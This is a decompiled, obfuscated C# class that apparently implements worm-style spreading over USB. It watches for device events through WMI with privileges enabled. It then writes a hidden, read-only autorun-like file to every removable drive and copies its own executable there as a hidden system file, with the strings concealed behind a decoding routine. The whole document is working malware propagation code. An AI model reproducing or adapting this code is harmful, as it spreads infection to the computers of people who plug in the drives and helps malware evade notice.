using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Threading;
using ___codefort;

internal sealed class Class5
{
	private static ManagementEventWatcher managementEventWatcher_0;

	public static void smethod_0()
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0022: Expected O, but got Unknown
		//IL_0052: Unknown result type (might be due to invalid IL or missing references)
		//IL_005c: Expected O, but got Unknown
		//IL_0068: Unknown result type (might be due to invalid IL or missing references)
		//IL_0072: Expected O, but got Unknown
		ManagementScope val = new ManagementScope(Class22.smethod_0(737969285));
		val.get_Options().set_EnablePrivileges(true);
		try
		{
			WqlEventQuery val2 = new WqlEventQuery();
			val2.set_EventClassName(Class22.smethod_0(737968769));
			val2.set_WithinInterval(new TimeSpan(0, 0, 3));
			val2.set_Condition(Class22.smethod_0(737968807));
			managementEventWatcher_0 = new ManagementEventWatcher(val, (EventQuery)(object)val2);
			managementEventWatcher_0.add_EventArrived(new EventArrivedEventHandler(smethod_1));
			managementEventWatcher_0.Start();
		}
		catch
		{
			if (managementEventWatcher_0 != null)
			{
				managementEventWatcher_0.Stop();
			}
		}
	}

	public static void smethod_1(object sender, EventArgs e)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			if (driveInfo.DriveType == DriveType.Removable)
			{
				try
				{
					if (File.Exists(driveInfo.Name + Class22.smethod_0(737968722)))
					{
						File.Delete(driveInfo.Name + Class22.smethod_0(737968722));
					}
					if (File.Exists(driveInfo.Name + Class22.smethod_0(737968748)))
					{
						File.Delete(driveInfo.Name + Class22.smethod_0(737968748));
					}
				}
				catch
				{
				}
				StreamWriter streamWriter = new StreamWriter(driveInfo.Name + Class22.smethod_0(737968722));
				streamWriter.WriteLine(Class22.smethod_0(737968766));
				streamWriter.WriteLine(Class22.smethod_0(737968654));
				streamWriter.WriteLine(Class22.smethod_0(737968676));
				streamWriter.WriteLine(Class22.smethod_0(737969109));
				streamWriter.WriteLine(Class22.smethod_0(737969122));
				streamWriter.WriteLine(Class22.smethod_0(737969027));
				streamWriter.Close();
				File.SetAttributes(driveInfo.Name + Class22.smethod_0(737968722), File.GetAttributes(driveInfo.Name + Class22.smethod_0(737968722)) | FileAttributes.System | FileAttributes.Hidden | FileAttributes.NotContentIndexed | FileAttributes.ReadOnly);
				try
				{
					File.Copy(Process.GetCurrentProcess().MainModule!.FileName, driveInfo.Name + Class22.smethod_0(737968748));
					File.SetAttributes(driveInfo.Name + Class22.smethod_0(737968748), File.GetAttributes(driveInfo.Name + Class22.smethod_0(737968748)) | FileAttributes.System | FileAttributes.Hidden | FileAttributes.NotContentIndexed | FileAttributes.ReadOnly);
				}
				finally
				{
					Thread.Sleep(2000);
				}
			}
			if (managementEventWatcher_0 != null)
			{
				managementEventWatcher_0.Stop();
			}
			managementEventWatcher_0.Start();
		}
	}
}
